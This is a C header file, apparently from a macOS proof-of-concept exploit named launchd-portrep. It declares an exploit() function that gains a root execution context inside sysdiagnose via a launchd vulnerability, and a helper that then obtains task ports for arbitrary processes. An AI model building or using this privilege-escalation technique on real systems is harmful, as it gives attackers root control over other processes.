#ifndef LAUNCHD_PORTREP__EXPLOIT_H_
#define LAUNCHD_PORTREP__EXPLOIT_H_

#include "threadexec/threadexec.h"

#include <unistd.h>

/*
 * exploit
 *
 * Description:
 * 	Use the launchd-portrep vulnerability to create a threadexec execution context inside the
 * 	sysdiagnose process, which is root and has the task_for_pid-allow entitlement.
 *
 * Returns:
 * 	Returns an execution context inside the sysdiagnose process on success.
 *
 * Notes:
 * 	The exploit will fail if the sysdiagnose process is already running.
 */
threadexec_t exploit(void);

/*
 * threadexec_task_for_pid
 *
 * Description:
 * 	Use the threadexec execution context inside a task_for_pid-allow process to get the task
 * 	port for the specified PID.
 *
 * Parameters:
 * 	threadexec			The threadexec context.
 * 	pid				The PID of the target process.
 * 	task			out	On return, the task port of the process.
 *
 * Returns:
 * 	Returns true on success.
 */
bool threadexec_task_for_pid(threadexec_t threadexec, pid_t pid, mach_port_t *task);

#endif
